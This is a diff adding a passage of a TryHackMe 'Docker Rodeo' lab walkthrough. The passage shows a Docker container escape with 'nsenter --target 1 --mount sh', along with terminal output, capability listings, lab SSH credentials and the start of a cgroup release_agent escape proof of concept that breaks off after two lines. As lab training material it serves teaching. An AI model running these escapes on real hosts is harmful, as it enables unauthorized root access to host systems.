@@ -1670,3 +1670,839 @@ root      1717  0.0  0.1 407048  3904 ?        Sl   00:42   0:00 /usr/bin/docker
 root      1723  0.0  0.2 108724  5532 ?        Sl   00:42   0:00 containerd-shim -nam
 root      1724  0.0  0.2 108724  5628 ?        Sl   00:42   0:00 containerd-shim -nam
 root      1728  0.0  0.3 108724  6360 ?        Sl   00:42   0:00 containerd-shim -nam
+root      1734  0.0  0.1 626836  3988 ?        Sl   00:42   0:00 /usr/bin/docker-prox
+root      1748  0.0  0.2 553104  4076 ?        Sl   00:42   0:00 /usr/bin/docker-prox
+root      1767  0.0  0.3 110132  6116 ?        Sl   00:42   0:00 containerd-shim -nam
+root      1772  0.0  0.2 108724  5052 ?        Sl   00:42   0:00 containerd-shim -nam
+root      1847  0.0  0.3  72304  6068 ?        Ss   00:42   0:00 /usr/sbin/sshd -D
+root      1853  0.0  0.3  72304  6184 ?        Ss   00:42   0:00 /usr/sbin/sshd -D
+root      1875  0.0  0.3  72304  6320 ?        Ss   00:42   0:00 /usr/sbin/sshd -D
+root      1881  0.0  0.8 122768 16176 ?        Ssl  00:42   0:00 registry serve /etc/
+root      1894  0.0  0.8 122768 16544 ?        Ssl  00:42   0:00 registry serve /etc/
+root      2516  0.0  0.0      0     0 ?        I    00:56   0:00 [kworker/1:1]
+root      2658  0.0  0.0      0     0 ?        I    01:24   0:00 [kworker/u4:0]
+root      2680  0.0  0.0      0     0 ?        I    01:36   0:00 [kworker/u4:2]
+root      2695  0.0  0.0      0     0 ?        I    01:36   0:00 [kworker/1:2]
+root      2705  0.0  0.0      0     0 ?        I    01:36   0:00 [kworker/0:0]
+root      2721  0.0  0.3  72360  6476 ?        Ss   01:41   0:00 sshd: root@pts/0
+root      2725  0.0  0.1  20256  3776 pts/0    Ss   01:41   0:00 -bash
+root      2736  0.0  0.1  36152  3248 pts/0    R+   01:41   0:00 ps aux
+```
+Use the following exploit: nsenter --target 1 --mount sh which does the following:
+1. We use the --target switch with the value of "1" to execute our shell command that we later provide to execute in the namespace of the special system process ID, to get ultimate root!
+2. Specifying --mount this is where we provide the mount namespace of the process that we are targeting. "If no file is specified, enter the mount namespace of the target process." (Man.org., 2013)
+3. As we are targeting  the "/sbin/init" process #1 (although it's actually a symbolic link to "lib/systemd/systemd" for backwards-compatibility), we are using the namespace and permissions of the [systemd](https://www.freedesktop.org/wiki/Software/systemd/) daemon for our new process (the shell)
+4. Here's where our process that will be executed into this privileged namespace: sh or a shell. This will execute in the same namespace (and therefore privileges of) the kernel.
+![](https://assets.tryhackme.com/additional/docker-rodeo/namespaces/esc2.png)
+You may need to "Ctrl + C" to cancel the exploit once or twice for this vulnerability to work, but as you can see below, we have escaped the docker container can look around the host OS (showing the change in hostname)
+Remembering that our exploit is as follows: nsenter --target 1 --mount sh
+```text
+oops i was actually root :(
+
+so doing with danny:danny in the same port to get root
+
+──(kali㉿kali)-[~/docker_rodeo]
+└─$ ssh danny@10.10.153.100 -p 2244
+danny@10.10.153.100's password: 
+danny@63b932f4d7d2:~$ whoami
+danny
+danny@63b932f4d7d2:~$ ps aux
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.4 159864  9096 ?        Ss   00:41   0:02 /sbin/init
+root         2  0.0  0.0      0     0 ?        S    00:41   0:00 [kthreadd]
+root         4  0.0  0.0      0     0 ?        I<   00:41   0:00 [kworker/0:0H]
+root         6  0.0  0.0      0     0 ?        I<   00:41   0:00 [mm_percpu_wq]
+root         7  0.0  0.0      0     0 ?        S    00:41   0:00 [ksoftirqd/0]
+root         8  0.0  0.0      0     0 ?        I    00:41   0:00 [rcu_sched]
+root         9  0.0  0.0      0     0 ?        I    00:41   0:00 [rcu_bh]
+root        10  0.0  0.0      0     0 ?        S    00:41   0:00 [migration/0]
+root        11  0.0  0.0      0     0 ?        S    00:41   0:00 [watchdog/0]
+root        12  0.0  0.0      0     0 ?        S    00:41   0:00 [cpuhp/0]
+root        13  0.0  0.0      0     0 ?        S    00:41   0:00 [cpuhp/1]
+root        14  0.0  0.0      0     0 ?        S    00:41   0:00 [watchdog/1]
+root        15  0.0  0.0      0     0 ?        S    00:41   0:00 [migration/1]
+root        16  0.0  0.0      0     0 ?        S    00:41   0:00 [ksoftirqd/1]
+root        17  0.0  0.0      0     0 ?        I    00:41   0:00 [kworker/1:0]
+root        18  0.0  0.0      0     0 ?        I<   00:41   0:00 [kworker/1:0H]
+root        19  0.0  0.0      0     0 ?        S    00:41   0:00 [kdevtmpfs]
+root        20  0.0  0.0      0     0 ?        I<   00:41   0:00 [netns]
+root        21  0.0  0.0      0     0 ?        S    00:41   0:00 [rcu_tasks_kthre]
+root        22  0.0  0.0      0     0 ?        S    00:41   0:00 [kauditd]
+root        24  0.0  0.0      0     0 ?        I    00:41   0:00 [kworker/0:1]
+root        25  0.0  0.0      0     0 ?        S    00:41   0:00 [khungtaskd]
+root        26  0.0  0.0      0     0 ?        S    00:41   0:00 [oom_reaper]
+root        27  0.0  0.0      0     0 ?        I<   00:41   0:00 [writeback]
+root        28  0.0  0.0      0     0 ?        S    00:41   0:00 [kcompactd0]
+root        29  0.0  0.0      0     0 ?        SN   00:41   0:00 [ksmd]
+root        30  0.0  0.0      0     0 ?        SN   00:41   0:00 [khugepaged]
+root        31  0.0  0.0      0     0 ?        I<   00:41   0:00 [crypto]
+root        32  0.0  0.0      0     0 ?        I<   00:41   0:00 [kintegrityd]
+root        33  0.0  0.0      0     0 ?        I<   00:41   0:00 [kblockd]
+root        34  0.0  0.0      0     0 ?        I<   00:41   0:00 [ata_sff]
+root        35  0.0  0.0      0     0 ?        I<   00:41   0:00 [md]
+root        36  0.0  0.0      0     0 ?        I<   00:41   0:00 [edac-poller]
+root        37  0.0  0.0      0     0 ?        I<   00:41   0:00 [devfreq_wq]
+root        38  0.0  0.0      0     0 ?        I<   00:41   0:00 [watchdogd]
+root        41  0.0  0.0      0     0 ?        S    00:41   0:00 [kswapd0]
+root        42  0.0  0.0      0     0 ?        I<   00:41   0:00 [kworker/u5:0]
+root        43  0.0  0.0      0     0 ?        S    00:41   0:00 [ecryptfs-kthrea]
+root        85  0.0  0.0      0     0 ?        I<   00:41   0:00 [kthrotld]
+root        86  0.0  0.0      0     0 ?        I<   00:41   0:00 [acpi_thermal_pm]
+root        90  0.0  0.0      0     0 ?        I<   00:41   0:00 [ipv6_addrconf]
+root        99  0.0  0.0      0     0 ?        I<   00:41   0:00 [kstrp]
+root       117  0.0  0.0      0     0 ?        I<   00:41   0:00 [charger_manager]
+root       155  0.0  0.0      0     0 ?        I<   00:41   0:00 [nvme-wq]
+root       157  0.0  0.0      0     0 ?        I<   00:41   0:00 [ena]
+root       222  0.0  0.0      0     0 ?        I<   00:41   0:00 [kdmflush]
+root       224  0.0  0.0      0     0 ?        I<   00:41   0:00 [bioset]
+root       300  0.0  0.0      0     0 ?        I<   00:41   0:00 [raid5wq]
+root       353  0.0  0.0      0     0 ?        S    00:41   0:00 [jbd2/dm-0-8]
+root       354  0.0  0.0      0     0 ?        I<   00:41   0:00 [ext4-rsv-conver]
+root       387  0.0  0.0      0     0 ?        I<   00:41   0:00 [kworker/1:1H]
+root       388  0.0  0.0      0     0 ?        I<   00:41   0:00 [kworker/0:1H]
+root       430  0.0  0.8  94884 16980 ?        S<s  00:42   0:00 /lib/systemd/systemd
+root       446  0.0  0.0      0     0 ?        I<   00:42   0:00 [iscsi_eh]
+root       448  0.0  0.0      0     0 ?        I<   00:42   0:00 [ib-comp-wq]
+root       449  0.0  0.0      0     0 ?        I<   00:42   0:00 [ib-comp-unb-wq]
+root       450  0.0  0.0      0     0 ?        I<   00:42   0:00 [ib_mcast]
+root       451  0.0  0.0      0     0 ?        I<   00:42   0:00 [ib_nl_sa_wq]
+root       452  0.0  0.0      0     0 ?        I<   00:42   0:00 [rdma_cm]
+root       453  0.0  0.0 105904  1764 ?        Ss   00:42   0:00 /sbin/lvmetad -f
+root       459  0.0  0.2  46748  5580 ?        Ss   00:42   0:01 /lib/systemd/systemd
+root       462  0.0  0.0      0     0 ?        S<   00:42   0:00 [loop0]
+root       463  0.0  0.0      0     0 ?        S<   00:42   0:00 [loop1]
+root       631  0.0  0.0      0     0 ?        S    00:42   0:00 [jbd2/nvme1n1p2-]
+root       632  0.0  0.0      0     0 ?        I<   00:42   0:00 [ext4-rsv-conver]
+62583      746  0.0  0.1 141960  3248 ?        Ssl  00:42   0:00 /lib/systemd/systemd
+_apt       881  0.0  0.2  80204  5396 ?        Ss   00:42   0:00 /lib/systemd/systemd
+sshd       922  0.0  0.3  70792  6208 ?        Ss   00:42   0:00 /lib/systemd/systemd
+daemon    1019  0.0  0.1  28332  2464 ?        Ss   00:42   0:00 /usr/sbin/atd -f
+102       1021  0.0  0.2 263036  4424 ?        Ssl  00:42   0:00 /usr/sbin/rsyslogd -
+root      1027  0.0  0.0 161076  1548 ?        Ssl  00:42   0:00 /usr/bin/lxcfs /var/
+root      1032  0.0  0.3 286452  6780 ?        Ssl  00:42   0:00 /usr/lib/accountsser
+root      1033  0.0  0.2  62156  5768 ?        Ss   00:42   0:00 /lib/systemd/systemd
+103       1036  0.0  0.2  50104  4328 ?        Ss   00:42   0:00 /usr/bin/dbus-daemon
+root      1096  0.0  1.3 876020 26896 ?        Ssl  00:42   0:00 /usr/bin/amazon-ssm-
+root      1097  0.0  0.8 169192 17112 ?        Ssl  00:42   0:00 /usr/bin/python3 /us
+root      1105  0.0  0.1  30104  3204 ?        Ss   00:42   0:00 /usr/sbin/cron -f
+root      1111  0.0  1.2 931740 26016 ?        Ssl  00:42   0:01 /usr/lib/snapd/snapd
+root      1114  0.0  0.1 110416  2056 ?        Ssl  00:42   0:00 /usr/sbin/irqbalance
+root      1119  0.1  2.4 1288996 49196 ?       Ssl  00:42   0:05 /usr/bin/containerd
+root      1122  0.0  0.9 186032 19924 ?        Ssl  00:42   0:00 /usr/bin/python3 /us
+root      1132  0.0  0.1  14768  2320 ttyS0    Ss+  00:42   0:00 /sbin/agetty -o -p -
+root      1134  0.0  0.3 291448  7096 ?        Ssl  00:42   0:00 /usr/lib/policykit-1
+root      1143  0.0  0.1  13244  2020 tty1     Ss+  00:42   0:00 /sbin/agetty -o -p -
+root      1205  0.0  0.3  72304  6428 ?        Ss   00:42   0:00 /usr/sbin/sshd -D
+root      1423  0.0  4.2 1401928 85800 ?       Ssl  00:42   0:02 /usr/bin/dockerd -H 
+root      1684  0.0  0.1 479372  3932 ?        Sl   00:42   0:00 /usr/bin/docker-prox
+root      1704  0.0  0.2 553104  4048 ?        Sl   00:42   0:00 /usr/bin/docker-prox
+root      1717  0.0  0.1 407048  3904 ?        Sl   00:42   0:00 /usr/bin/docker-prox
+root      1723  0.0  0.2 108724  5532 ?        Sl   00:42   0:00 containerd-shim -nam
+root      1724  0.0  0.2 108724  5628 ?        Sl   00:42   0:00 containerd-shim -nam
+root      1728  0.0  0.3 108724  6360 ?        Sl   00:42   0:00 containerd-shim -nam
+root      1734  0.0  0.1 626836  3988 ?        Sl   00:42   0:00 /usr/bin/docker-prox
+root      1748  0.0  0.2 553104  4076 ?        Sl   00:42   0:00 /usr/bin/docker-prox
+root      1767  0.0  0.3 110132  6116 ?        Sl   00:42   0:00 containerd-shim -nam
+root      1772  0.0  0.2 108724  5052 ?        Sl   00:42   0:00 containerd-shim -nam
+root      1847  0.0  0.3  72304  6068 ?        Ss   00:42   0:00 /usr/sbin/sshd -D
+root      1853  0.0  0.3  72304  6184 ?        Ss   00:42   0:00 /usr/sbin/sshd -D
+root      1875  0.0  0.3  72304  6320 ?        Ss   00:42   0:00 /usr/sbin/sshd -D
+root      1881  0.0  0.8 122768 16168 ?        Ssl  00:42   0:00 registry serve /etc/
+root      1894  0.0  0.8 122768 16544 ?        Ssl  00:42   0:00 registry serve /etc/
+root      2658  0.0  0.0      0     0 ?        I    01:24   0:00 [kworker/u4:0]
+root      2680  0.0  0.0      0     0 ?        I    01:36   0:00 [kworker/u4:2]
+root      2695  0.0  0.0      0     0 ?        I    01:36   0:00 [kworker/1:2]
+root      2705  0.0  0.0      0     0 ?        I    01:36   0:00 [kworker/0:0]
+root      2740  0.0  0.0      0     0 ?        I    01:48   0:00 [kworker/u4:1]
+root      2741  0.0  0.3  72360  6452 ?        Ss   01:50   0:00 sshd: danny [priv]
+danny     2743  0.0  0.1  72360  3420 ?        R    01:50   0:00 sshd: danny@pts/0
+danny     2744  0.0  0.1  20256  3876 pts/0    Ss   01:50   0:00 -bash
+danny     2752  0.0  0.1  36152  3180 pts/0    R+   01:51   0:00 ps aux
+
+nope I was wrong 🤣
+
+danny@63b932f4d7d2:~$ nsenter --target 1 --mount sh
+nsenter: cannot open /proc/1/ns/mnt: Permission denied
+danny@63b932f4d7d2:~$ sudo nsenter --target 1 --mount sh
+[sudo] password for danny: 
+Sorry, user danny is not allowed to execute '/usr/bin/nsenter --target 1 --mount sh' as root on 63b932f4d7d2.
+danny@63b932f4d7d2:~$ exit
+logout
+Connection to 10.10.153.100 closed.
+```
+```text
+┌──(kali㉿kali)-[~/docker_rodeo]
+└─$ ssh root@10.10.153.100 -p 2244
+root@10.10.153.100's password: 
+Last login: Wed Oct 26 01:41:09 2022 from 10.13.0.182
+root@63b932f4d7d2:~# ps aux
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.4 159864  9096 ?        Ss   00:41   0:02 /sbin/init
+root         2  0.0  0.0      0     0 ?        S    00:41   0:00 [kthreadd]
+root         4  0.0  0.0      0     0 ?        I<   00:41   0:00 [kworker/0:0H]
+root         6  0.0  0.0      0     0 ?        I<   00:41   0:00 [mm_percpu_wq]
+root         7  0.0  0.0      0     0 ?        S    00:41   0:00 [ksoftirqd/0]
+root         8  0.0  0.0      0     0 ?        I    00:41   0:00 [rcu_sched]
+root         9  0.0  0.0      0     0 ?        I    00:41   0:00 [rcu_bh]
+root        10  0.0  0.0      0     0 ?        S    00:41   0:00 [migration/0]
+root        11  0.0  0.0      0     0 ?        S    00:41   0:00 [watchdog/0]
+root        12  0.0  0.0      0     0 ?        S    00:41   0:00 [cpuhp/0]
+root        13  0.0  0.0      0     0 ?        S    00:41   0:00 [cpuhp/1]
+root        14  0.0  0.0      0     0 ?        S    00:41   0:00 [watchdog/1]
+root        15  0.0  0.0      0     0 ?        S    00:41   0:00 [migration/1]
+root        16  0.0  0.0      0     0 ?        S    00:41   0:00 [ksoftirqd/1]
+root        17  0.0  0.0      0     0 ?        I    00:41   0:00 [kworker/1:0]
+root        18  0.0  0.0      0     0 ?        I<   00:41   0:00 [kworker/1:0H]
+root        19  0.0  0.0      0     0 ?        S    00:41   0:00 [kdevtmpfs]
+root        20  0.0  0.0      0     0 ?        I<   00:41   0:00 [netns]
+root        21  0.0  0.0      0     0 ?        S    00:41   0:00 [rcu_tasks_kthre]
+root        22  0.0  0.0      0     0 ?        S    00:41   0:00 [kauditd]
+root        24  0.0  0.0      0     0 ?        I    00:41   0:00 [kworker/0:1]
+root        25  0.0  0.0      0     0 ?        S    00:41   0:00 [khungtaskd]
+root        26  0.0  0.0      0     0 ?        S    00:41   0:00 [oom_reaper]
+root        27  0.0  0.0      0     0 ?        I<   00:41   0:00 [writeback]
+root        28  0.0  0.0      0     0 ?        S    00:41   0:00 [kcompactd0]
+root        29  0.0  0.0      0     0 ?        SN   00:41   0:00 [ksmd]
+root        30  0.0  0.0      0     0 ?        SN   00:41   0:00 [khugepaged]
+root        31  0.0  0.0      0     0 ?        I<   00:41   0:00 [crypto]
+root        32  0.0  0.0      0     0 ?        I<   00:41   0:00 [kintegrityd]
+root        33  0.0  0.0      0     0 ?        I<   00:41   0:00 [kblockd]
+root        34  0.0  0.0      0     0 ?        I<   00:41   0:00 [ata_sff]
+root        35  0.0  0.0      0     0 ?        I<   00:41   0:00 [md]
+root        36  0.0  0.0      0     0 ?        I<   00:41   0:00 [edac-poller]
+root        37  0.0  0.0      0     0 ?        I<   00:41   0:00 [devfreq_wq]
+root        38  0.0  0.0      0     0 ?        I<   00:41   0:00 [watchdogd]
+root        41  0.0  0.0      0     0 ?        S    00:41   0:00 [kswapd0]
+root        42  0.0  0.0      0     0 ?        I<   00:41   0:00 [kworker/u5:0]
+root        43  0.0  0.0      0     0 ?        S    00:41   0:00 [ecryptfs-kthrea]
+root        85  0.0  0.0      0     0 ?        I<   00:41   0:00 [kthrotld]
+root        86  0.0  0.0      0     0 ?        I<   00:41   0:00 [acpi_thermal_pm]
+root        90  0.0  0.0      0     0 ?        I<   00:41   0:00 [ipv6_addrconf]
+root        99  0.0  0.0      0     0 ?        I<   00:41   0:00 [kstrp]
+root       117  0.0  0.0      0     0 ?        I<   00:41   0:00 [charger_manager]
+root       155  0.0  0.0      0     0 ?        I<   00:41   0:00 [nvme-wq]
+root       157  0.0  0.0      0     0 ?        I<   00:41   0:00 [ena]
+root       222  0.0  0.0      0     0 ?        I<   00:41   0:00 [kdmflush]
+root       224  0.0  0.0      0     0 ?        I<   00:41   0:00 [bioset]
+root       300  0.0  0.0      0     0 ?        I<   00:41   0:00 [raid5wq]
+root       353  0.0  0.0      0     0 ?        S    00:41   0:00 [jbd2/dm-0-8]
+root       354  0.0  0.0      0     0 ?        I<   00:41   0:00 [ext4-rsv-conver]
+root       387  0.0  0.0      0     0 ?        I<   00:41   0:00 [kworker/1:1H]
+root       388  0.0  0.0      0     0 ?        I<   00:41   0:00 [kworker/0:1H]
+root       430  0.0  0.8  94884 16980 ?        S<s  00:42   0:00 /lib/systemd/systemd
+root       446  0.0  0.0      0     0 ?        I<   00:42   0:00 [iscsi_eh]
+root       448  0.0  0.0      0     0 ?        I<   00:42   0:00 [ib-comp-wq]
+root       449  0.0  0.0      0     0 ?        I<   00:42   0:00 [ib-comp-unb-wq]
+root       450  0.0  0.0      0     0 ?        I<   00:42   0:00 [ib_mcast]
+root       451  0.0  0.0      0     0 ?        I<   00:42   0:00 [ib_nl_sa_wq]
+root       452  0.0  0.0      0     0 ?        I<   00:42   0:00 [rdma_cm]
+root       453  0.0  0.0 105904  1764 ?        Ss   00:42   0:00 /sbin/lvmetad -f
+root       459  0.0  0.2  46748  5580 ?        Ss   00:42   0:01 /lib/systemd/systemd
+root       462  0.0  0.0      0     0 ?        S<   00:42   0:00 [loop0]
+root       463  0.0  0.0      0     0 ?        S<   00:42   0:00 [loop1]
+root       631  0.0  0.0      0     0 ?        S    00:42   0:00 [jbd2/nvme1n1p2-]
+root       632  0.0  0.0      0     0 ?        I<   00:42   0:00 [ext4-rsv-conver]
+62583      746  0.0  0.1 141960  3248 ?        Ssl  00:42   0:00 /lib/systemd/systemd
+_apt       881  0.0  0.2  80204  5396 ?        Ss   00:42   0:00 /lib/systemd/systemd
+sshd       922  0.0  0.3  70792  6208 ?        Ss   00:42   0:00 /lib/systemd/systemd
+daemon    1019  0.0  0.1  28332  2464 ?        Ss   00:42   0:00 /usr/sbin/atd -f
+102       1021  0.0  0.2 263036  4424 ?        Ssl  00:42   0:00 /usr/sbin/rsyslogd -
+root      1027  0.0  0.0 161076  1548 ?        Ssl  00:42   0:00 /usr/bin/lxcfs /var/
+root      1032  0.0  0.3 286452  6780 ?        Ssl  00:42   0:00 /usr/lib/accountsser
+root      1033  0.0  0.2  62156  5768 ?        Ss   00:42   0:00 /lib/systemd/systemd
+103       1036  0.0  0.2  50104  4328 ?        Ss   00:42   0:00 /usr/bin/dbus-daemon
+root      1096  0.0  1.3 876020 26896 ?        Ssl  00:42   0:00 /usr/bin/amazon-ssm-
+root      1097  0.0  0.8 169192 17112 ?        Ssl  00:42   0:00 /usr/bin/python3 /us
+root      1105  0.0  0.1  30104  3204 ?        Ss   00:42   0:00 /usr/sbin/cron -f
+root      1111  0.0  1.2 931740 26016 ?        Ssl  00:42   0:01 /usr/lib/snapd/snapd
+root      1114  0.0  0.1 110416  2056 ?        Ssl  00:42   0:00 /usr/sbin/irqbalance
+root      1119  0.1  2.4 1288996 49196 ?       Ssl  00:42   0:06 /usr/bin/containerd
+root      1122  0.0  0.9 186032 19924 ?        Ssl  00:42   0:00 /usr/bin/python3 /us
+root      1132  0.0  0.1  14768  2320 ttyS0    Ss+  00:42   0:00 /sbin/agetty -o -p -
+root      1134  0.0  0.3 291448  7096 ?        Ssl  00:42   0:00 /usr/lib/policykit-1
+root      1143  0.0  0.1  13244  2020 tty1     Ss+  00:42   0:00 /sbin/agetty -o -p -
+root      1205  0.0  0.3  72304  6428 ?        Ss   00:42   0:00 /usr/sbin/sshd -D
+root      1423  0.0  4.2 1401928 85800 ?       Ssl  00:42   0:02 /usr/bin/dockerd -H 
+root      1684  0.0  0.1 479372  3932 ?        Sl   00:42   0:00 /usr/bin/docker-prox
+root      1704  0.0  0.2 553104  4048 ?        Sl   00:42   0:00 /usr/bin/docker-prox
+root      1717  0.0  0.1 407048  3904 ?        Sl   00:42   0:00 /usr/bin/docker-prox
+root      1723  0.0  0.2 108724  5532 ?        Sl   00:42   0:00 containerd-shim -nam
+root      1724  0.0  0.2 108724  5628 ?        Sl   00:42   0:00 containerd-shim -nam
+root      1728  0.0  0.3 108724  6360 ?        Sl   00:42   0:00 containerd-shim -nam
+root      1734  0.0  0.1 626836  3988 ?        Sl   00:42   0:00 /usr/bin/docker-prox
+root      1748  0.0  0.2 553104  4076 ?        Sl   00:42   0:00 /usr/bin/docker-prox
+root      1767  0.0  0.3 110132  6116 ?        Sl   00:42   0:00 containerd-shim -nam
+root      1772  0.0  0.2 108724  5052 ?        Sl   00:42   0:00 containerd-shim -nam
+root      1847  0.0  0.3  72304  6068 ?        Ss   00:42   0:00 /usr/sbin/sshd -D
+root      1853  0.0  0.3  72304  6184 ?        Ss   00:42   0:00 /usr/sbin/sshd -D
+root      1875  0.0  0.3  72304  6320 ?        Ss   00:42   0:00 /usr/sbin/sshd -D
+root      1881  0.0  0.8 122768 16168 ?        Ssl  00:42   0:00 registry serve /etc/
+root      1894  0.0  0.8 122768 16544 ?        Ssl  00:42   0:00 registry serve /etc/
+root      2658  0.0  0.0      0     0 ?        I    01:24   0:00 [kworker/u4:0]
+root      2695  0.0  0.0      0     0 ?        I    01:36   0:00 [kworker/1:2]
+root      2705  0.0  0.0      0     0 ?        I    01:36   0:00 [kworker/0:0]
+root      2740  0.0  0.0      0     0 ?        I    01:48   0:00 [kworker/u4:1]
+root      2757  0.0  0.3  72360  6512 ?        Rs   01:53   0:00 sshd: root@pts/0
+root      2759  0.0  0.1  20256  3692 pts/0    Ss   01:53   0:00 -bash
+root      2767  0.0  0.1  36152  3232 pts/0    R+   01:53   0:00 ps aux
+
+root@63b932f4d7d2:~# cd /
+root@63b932f4d7d2:/# hostname
+63b932f4d7d2
+root@63b932f4d7d2:/# ls
+bin   dev  home  lib64  mnt  proc  run   srv  tmp  var
+boot  etc  lib   media  opt  root  sbin  sys  usr
+root@63b932f4d7d2:/# cd home
+root@63b932f4d7d2:/home# ls
+danny
+root@63b932f4d7d2:/home# cd /
+root@63b932f4d7d2:/# nsenter --target 1 --mount sh
+```
+```text
+# ls
+bin    dev   initrd.img      lib64       mnt   root  snap      sys  var
+boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
+cdrom  home  lib             media       proc  sbin  swap.img  usr  vmlinuz.old
+```
+```text
+# cd home
+```
+```text
+# ls
+cmnatic
+```
+```text
+# hostname
+63b932f4d7d2
+```
+```text
+# hostnamectl
+   Static hostname: docker-rodeo
+         Icon name: computer-vm
+           Chassis: vm
+        Machine ID: ccb536ad3f8b4cf49d4c5082f10bd5ad
+           Boot ID: cf0cb4adc33f497ab80f8350f5435d89
+    Virtualization: kvm
+  Operating System: Ubuntu 18.04.5 LTS
+            Kernel: Linux 4.15.0-123-generic
+      Architecture: x86-64
+```
+```text
+# exit
+
+root@63b932f4d7d2:/# hostnamectl
+-bash: hostnamectl: command not found
+```
+Attempt the exploit, you will know you are successful if you can ls /home/cmnatic
+*Completed*
+9.1. Understanding Capabilities
+At it's fundamental, Linux capabilities are root permissions given to processes or executables within the Linux kernel. These privileges allow for the granular assignment of privileges - rather than just assigning them all.
+These capabilities determine what permissions a Docker container has to the operating system, and how they are interacted with. Docker containers can run in two modes:
+User mode
+Privileged mode
+Let's refer back to our diagram in Task 2 where we detail how containers run on the operating system to highlight the differences between these two modes:
+![](https://assets.tryhackme.com/additional/docker-rodeo/privileged-container/privileged-container-layers.png)
+Note how containers #1 and #2 are running is "user"/"normal" mode whereas container 3 is running in "privileged" mode. Containers running in "user" mode interact with the operating system through the Docker engine. Privileged containers, however, do not do this...instead, they bypass the Docker engine and have direct communication with the operating system.
+9.2. What does this mean for us?
+Well, if a container is running with privileged access to the operating system, we can effectively execute commands as root - perfect!
+We can use a system package such as "libcap2-bin"'s capsh to list the capabilities our container has: capsh --print . I've highlighted a few interesting privileges that we have been given, but greatly encourage you to research into anymore that may be exploited! Privileges like these indicate that our container is running in privileged mode.
+![999](https://assets.tryhackme.com/additional/docker-rodeo/privileged-container/listcap2.png)
+```text
+root@63b932f4d7d2:/# capsh --print
+Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+eip
+Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
+Securebits: 00/0x0/1'b0
+ secure-noroot: no (unlocked)
+ secure-no-suid-fixup: no (unlocked)
+ secure-keep-caps: no (unlocked)
+uid=0(root)
+gid=0(root)
+groups=0(root)
+```
+Before we begin to exploit this for ourselves, you will need to deploy the new Instance attached to this Task. The vulnerabilities of the previous VM conflict with this exploit.
+9.3. Connecting to the container:
+Connect to your new Instance using SSH with the following details:
+New Instance IP: 10.10.153.100
+SSH Port: 2244
+Username: root
+Password: danny
+Allowing a few minutes for the new Instance to deploy, I'm going to demonstrate leveraging the "sys_admin" capability. We can confirm we have this capability by grepping the output of capsh :
+![](https://assets.tryhackme.com/additional/docker-rodeo/privileged-container/getcap1.png)
+```text
+┌──(kali㉿kali)-[~/docker_rodeo]
+└─$ ssh root@10.10.57.156 -p 2244 
+The authenticity of host '[10.10.57.156]:2244 ([10.10.57.156]:2244)' can't be established.
+ED25519 key fingerprint is SHA256:QchorENAwrThUT9x4jVndMlySTLaddY+QiUNI6xRWR4.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.57.156]:2244' (ED25519) to the list of known hosts.
+root@10.10.57.156's password: 
+root@8a9427527c82:~# capsh --print | grep sys_admin
+Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+eip
+Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
+```
+This capability permits us to do multiple of things (which is listed h[here](https://linux.die.net/man/7/capabilities)), but we're going to focus on the ability given to use us via "sys_admin" to be able to [mount](https://linux.die.net/man/2/mount) files from the host OS into the container.
+The code snippet below is based upon (but a modified) version of the Proof of Concept ([PoC](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.)) created by Trailofbits where they detail the inner-workings to this exploit well.
+https://arstechnica.com/information-technology/2018/06/backdoored-images-downloaded-5-million-times-finally-removed-from-docker-hub/
+```text
+1.  mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+
+2.  echo 1 > /tmp/cgrp/x/notify_on_release
